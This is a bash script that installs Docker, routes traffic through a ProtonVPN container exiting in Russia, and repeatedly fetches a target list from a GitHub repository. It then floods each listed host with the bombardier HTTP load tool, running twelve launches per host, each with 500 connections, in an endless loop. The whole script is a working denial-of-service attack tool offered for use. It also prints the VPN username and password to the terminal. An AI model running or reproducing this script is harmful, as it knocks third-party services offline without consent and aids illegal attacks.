#!/bin/bash -x

TIME="30s"

while getopts 'u:p:f:' flag; do
  case "${flag}" in
    u) windscribeUserName=${OPTARG};;
    p) windscribePassword=${OPTARG};;
    f) fileName=${OPTARG};;
  esac
done

echo $windscribeUserName
echo $windscribePassword
echo $fileName

if [ -x "$(command -v docker)" ]; then
    echo "Docker installed"
else
    apt-get update
    echo "Install docker"
    apt-get update

    apt-get -y install \
    ca-certificates \
    curl \
    gnupg \
    lsb-release

    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg

    echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

  apt-get update

  apt-get -y install docker-ce docker-ce-cli containerd.io
fi

docker run \
--rm \
--detach \
--name=vpn \
--device=/dev/net/tun \
--cap-add=NET_ADMIN \
--env PROTONVPN_USERNAME="$windscribeUserName" \
--env PROTONVPN_PASSWORD="$windscribePassword" \
--env PROTONVPN_TIER=0 \
--env PROTONVPN_SERVER=RU \
ghcr.io/tprasadtp/protonvpn:latest

#docker run --name vpn -e PUID=1000 -e PGID=1000 -e WINDSCRIBE_USERNAME=$windscribeUserName -e WINDSCRIBE_PASSWORD=$windscribePassword -e WINDSCRIBE_LOCATION=RU -e VPN_PORT=8080 --dns 8.8.8.8 --cap-add NET_ADMIN --restart unless-stopped -d wiorca/docker-windscribe

while :
do
    wget -O list.txt https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/$fileName.txt
    myarray=(`cat list.txt`)
    noofelements=${#myarray[*]}
    counter=0
    while [ $counter -lt $noofelements ]
    do
        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 500 -d $TIME -l ${myarray[$counter]}
        sleep 3
        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 500 -d $TIME -l ${myarray[$counter]}
        sleep 3
        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 500 -d $TIME -l ${myarray[$counter]}
        sleep 3
        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 500 -d $TIME -l ${myarray[$counter]}
        sleep 3
        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 500 -d $TIME -l ${myarray[$counter]}
        sleep 3
        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 500 -d $TIME -l ${myarray[$counter]}
        sleep 3
        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 500 -d $TIME -l ${myarray[$counter]}
        sleep 3
        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 500 -d $TIME -l ${myarray[$counter]}
        sleep 3
        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 500 -d $TIME -l ${myarray[$counter]}
        sleep 3
        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 500 -d $TIME -l ${myarray[$counter]}
        sleep 3
        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 500 -d $TIME -l ${myarray[$counter]}
        sleep 3
        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 500 -d $TIME -l ${myarray[$counter]}
        sleep 3
        counter=$(( $counter + 1 ))
    done
done
